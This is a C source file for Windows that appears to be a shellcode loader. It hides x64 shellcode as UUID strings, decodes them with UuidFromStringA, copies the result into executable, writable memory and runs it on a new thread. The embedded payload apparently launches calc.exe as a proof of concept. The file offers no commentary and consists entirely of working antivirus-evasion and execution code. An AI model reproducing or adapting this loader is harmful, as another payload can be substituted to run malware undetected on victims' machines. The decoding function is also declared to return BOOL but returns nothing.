#include <stdio.h>
#include <Windows.h>

typedef NTSTATUS(NTAPI* fnUuidFromStringA)(
	RPC_CSTR StringUuid,
	UUID* Uuid
	);


BOOL uuid_defuscation(IN CHAR* uuid_array[], IN INT number_of_elements, OUT PBYTE* p_to_decrypted_address, OUT INT* p_to_decrypted_size) {
	PBYTE  pbuffer = NULL;
	PBYTE temp_buffer = NULL;
	INT buffer_size = NULL;

	HMODULE Rpcrt4 = LoadLibraryA("Rpcrt4.dll");

	fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(Rpcrt4,"UuidFromStringA");

	buffer_size = number_of_elements * 16;

	pbuffer = HeapAlloc(GetProcessHeap(),0,buffer_size);

	temp_buffer = pbuffer;

	for (int i = 0; i < number_of_elements; i++) {
		pUuidFromStringA(uuid_array[i], temp_buffer);
		temp_buffer +=16;
		}
	
	*p_to_decrypted_address = pbuffer;
	*p_to_decrypted_size = buffer_size;
}

int main() {
	
	char* uuid_array[18] = { "E48348FC-E8F0-00C0-0000-415141505251","D2314856-4865-528B-6048-8B5218488B52","728B4820-4850-B70F-4A4A-4D31C94831C0","7C613CAC-2C02-4120-C1C9-0D4101C1E2ED","48514152-528B-8B20-423C-4801D08B8088","48000000-C085-6774-4801-D0508B481844","4920408B-D001-56E3-48FF-C9418B348848","314DD601-48C9-C031-AC41-C1C90D4101C1","F175E038-034C-244C-0845-39D175D85844","4924408B-D001-4166-8B0C-48448B401C49","8B41D001-8804-0148-D041-5841585E595A","59415841-5A41-8348-EC20-4152FFE05841","8B485A59-E912-FF57-FFFF-5D48BA010000","00000000-4800-8D8D-0101-000041BA318B","D5FF876F-E0BB-2A1D-0A41-BAA695BD9DFF","C48348D5-3C28-7C06-0A80-FBE07505BB47","6A6F7213-5900-8941-DAFF-D563616C632E","00657865-63D5-6C61-632E-657865007865"
	};

  int size_of_array =  sizeof(uuid_array) / sizeof(uuid_array[0]);

  INT decrypted_size = 0;

  PBYTE decrypted_address = NULL;

  uuid_defuscation(uuid_array,size_of_array,&decrypted_address,&decrypted_size);

  for (int i = 0; i < decrypted_size; i++) {
	  printf("\\x%02X",decrypted_address[i]);
  }

  LPVOID alloc = VirtualAlloc(NULL,decrypted_size,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);

  memcpy(alloc,decrypted_address,decrypted_size);

  HANDLE Thread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)alloc,NULL,0,NULL);

  WaitForSingleObject(Thread,5000);
}
